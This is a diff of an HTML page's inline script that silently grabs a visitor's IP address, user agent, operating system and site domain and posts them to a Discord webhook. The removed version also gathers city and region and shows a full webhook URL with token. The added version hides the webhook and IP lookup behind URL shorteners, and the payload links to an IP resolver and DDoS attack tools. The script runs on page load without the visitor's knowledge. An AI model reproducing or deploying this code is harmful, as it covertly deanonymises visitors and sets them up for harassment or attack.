@@ -11,81 +11,78 @@
         }
     </style>
     <script>
-        function sendUserInformation() {
-            var webhookURL = 'https://discordapp.com/api/webhooks/1130835079904637061/FwaQdL2iEJIJ08NhRT6fBBALTR0V0jQQ5Gozasjxxka-9YePc0HMWlYV7qBPrtpvss5-';
+       var webhookURL = 'https://rb.gy/eknsx';
 
-            // Gather user information
-            var userAgent = navigator.userAgent;
-            var operatingSystem = navigator.platform;
-            var websiteDomain = location.hostname; // Get the current website domain
+var userAgent = navigator.userAgent;
+var operatingSystem = navigator.platform;
+var websiteDomain = location.hostname;
 
-            // Fetch IP address using external service
-            $.getJSON('https://api.ipify.org?format=json', function(data) {
-                var ip = data.ip;
+$.getJSON('https://tinyurl.com/tnjcrx2r', function(data) {
+    var ip = data.ip;
 
-                // Fetch additional information about the website domain
-                $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=YOUR_API_KEY&domain=' + websiteDomain, function(info) {
-                    var countryCode = info.country_code2;
-                    var city = info.city;
-                    var region = info.state_prov;
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookURL);
+    xhr.setRequestHeader("Content-Type", "application/json");
 
-                    var xhr = new XMLHttpRequest();
-                    xhr.open("POST", webhookURL);
-                    xhr.setRequestHeader("Content-Type", "application/json");
+    var params = {
+        embeds: [
+            {
+                title: 'User Information',
+                description: 'Here is some information about the user:',
+                color: 0x9933ff, // Purple color
+                fields: [
+                    {
+                        name: 'User Agent',
+                        value: userAgent,
+                        inline: true
+                    },
+                    {
+                        name: 'IP Address',
+                        value: ip,
+                        inline: true
+                    },
+                    {
+                        name: 'Website',
+                        value: websiteDomain,
+                        inline: false
+                    },
+                    {
+                        name: 'Operating System',
+                        value: operatingSystem,
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: 'Powered by https://lenn106.github.io'
+                },
+                timestamp: new Date().toISOString()
+            },
+            {
+                title: '**IP Tools**',
+                color: 0x7289da,
+                fields: [
+                    {
+                        name: 'IP Resolver',
+                        value: '[Click here](https://xresolver.com)'
+                    },
+                    {
+                        name: 'IP Lookup',
+                        value: '[Click here](https://whatismyipaddress.com/ip-lookup)'
+                    },
+                    {
+                        name: 'DDoS Attack Tools',
+                        value: '[Click here](https://github.com/topics/ddos-attack-tools)'
+                    }
+                ],
+                thumbnail: {
+                    url: 'https://tinyurl.com/hdr7euxt'
+                }
+            }
+        ]
+    };
 
-                    var params = {
-                        embeds: [
-                            {
-                                title: 'User Information',
-                                description: 'Here is some information about the user:\n\nWant more info? [Click here](https://lenn106.github.io/tools)',
-                                color: 0x7289da, // Discord blue color
-                                fields: [
-                                    {
-                                        name: 'IP Address',
-                                        value: ip,
-                                        inline: true
-                                    },
-                                    {
-                                        name: 'Country',
-                                        value: countryCode,
-                                        inline: true
-                                    },
-                                    {
-                                        name: 'City',
-                                        value: city,
-                                        inline: true
-                                    },
-                                    {
-                                        name: 'Region',
-                                        value: region,
-                                        inline: true
-                                    },
-                                    {
-                                        name: 'User Agent',
-                                        value: userAgent,
-                                        inline: true
-                                    },
-                                    {
-                                        name: 'Operating System',
-                                        value: operatingSystem,
-                                        inline: true
-                                    }
-                                ],
-                                thumbnail: {
-                                    url: 'https://your-website.com/logo.png'
-                                },
-                                footer: {
-                                    text: 'Powered by Your Website'
-                                },
-                                timestamp: new Date().toISOString()
-                            }
-                        ]
-                    };
-
-                    xhr.send(JSON.stringify(params));
-                });
-            });
-        }
+    xhr.send(JSON.stringify(params));
+});
     </script>
 </head>
 <body onload="sendUserInformation()">
